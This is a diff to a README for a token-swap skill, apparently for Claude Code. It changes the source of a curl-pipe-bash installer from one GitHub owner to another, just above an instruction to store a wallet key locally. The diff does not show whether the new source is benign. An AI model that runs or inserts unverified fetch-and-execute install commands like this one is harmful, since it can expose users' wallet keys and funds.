@@ -33,7 +33,7 @@ A Claude Code skill that provides **policy-enforced, two-step token swaps** on S
 ### Clawdbot (Recommended)
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/BAGWATCHER/SlopeSniper/main/skills/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/maddefientist/SlopeSniper/main/skills/install.sh | bash
 ```
 
 Then add your wallet key to `~/.clawdbot/clawdbot.json`:
